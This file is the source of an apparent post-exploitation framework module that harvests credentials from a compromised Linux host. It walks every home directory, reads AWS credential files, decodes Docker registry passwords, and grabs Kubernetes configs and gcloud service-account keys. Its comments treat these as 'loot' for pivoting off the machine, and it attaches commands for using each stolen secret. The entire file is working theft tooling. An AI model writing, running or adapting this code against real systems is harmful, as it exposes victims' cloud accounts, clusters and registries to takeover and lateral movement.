"""Cloud / orchestration credential collector: ~/.aws, gcloud, ~/.kube, ~/.docker.
These pivot OFF the box and are often the highest-value loot. reap grabbed AKIA
ids via the generic scanner but never the paired secret key, and never touched
kube/docker/gcloud.
"""
from __future__ import annotations

import base64
import json
import shlex

from ...models import Credential, Finding
from ..base import Module, register


def _homes(session) -> list[str]:
    out = session.exec("getent passwd 2>/dev/null || cat /etc/passwd", timeout=20).stdout
    homes = {"/root"}
    for line in out.splitlines():
        parts = line.split(":")
        if len(parts) >= 6 and parts[5].startswith(("/home/", "/root")):
            homes.add(parts[5].rstrip("/"))
    return sorted(homes)


@register
class CloudCreds(Module):
    name = "cloud_creds"

    def triggers(self, ctx) -> bool:
        return ctx.os in ("linux", "unknown")

    def collect(self, session):
        findings = []
        for home in _homes(session):
            findings += self._aws(session, home)
            findings += self._docker(session, home)
            findings += self._file_cap(
                session, f"{home}/.kube/config", "kube_config",
                "kubectl --kubeconfig <path> auth can-i --list")
            findings += self._file_cap(
                session, f"{home}/.config/gcloud/application_default_credentials.json",
                "gcp_adc", "gcloud auth activate-service-account with this key")
        return findings

    def _cat(self, session, path) -> str:
        return session.exec(f"cat {shlex.quote(path)} 2>/dev/null", timeout=10).stdout

    def _aws(self, session, home):
        out = []
        for rel in (".aws/credentials", ".aws/config"):
            path = f"{home}/{rel}"
            content = self._cat(session, path)
            if not content.strip():
                continue
            akid = secret = None
            for line in content.splitlines():
                s = line.strip()
                low = s.lower()
                if low.startswith("aws_access_key_id"):
                    akid = s.split("=", 1)[-1].strip()
                elif low.startswith("aws_secret_access_key"):
                    secret = s.split("=", 1)[-1].strip()
            if secret:
                out.append(Finding(
                    type="credential", severity="high", title="AWS secret access key",
                    detail=f"aws creds in {path}", source_module=self.name,
                    credential=Credential(
                        kind="token", secret=secret, source=path,
                        metadata={"type": "aws_secret_access_key",
                                  "aws_access_key_id": akid,
                                  "action": "aws sts get-caller-identity; enumerate "
                                            "with the paired access-key id"})))
        return out

    def _docker(self, session, home):
        out = []
        path = f"{home}/.docker/config.json"
        content = self._cat(session, path)
        if not content.strip():
            return out
        try:
            data = json.loads(content)
        except Exception:
            return out
        for reg, entry in (data.get("auths") or {}).items():
            auth = (entry or {}).get("auth")
            if not auth:
                continue
            try:
                dec = base64.b64decode(auth).decode("utf-8", "replace")
            except Exception:
                continue
            if ":" in dec:
                user, pw = dec.split(":", 1)
                out.append(Finding(
                    type="credential", severity="high",
                    title=f"Docker registry creds ({reg})", detail=f"from {path}",
                    source_module=self.name,
                    credential=Credential(kind="password", secret=pw, username=user,
                                          source=path, metadata={"registry": reg})))
        return out

    def _file_cap(self, session, path, cap, action):
        content = self._cat(session, path)
        if not content.strip():
            return []
        return [Finding(
            type="capability", severity="high", title=f"{cap} recovered",
            detail=path, source_module=self.name,
            credential=Credential(kind="capability", secret=path, source=path,
                                  metadata={"capability": cap, "action": action}))]
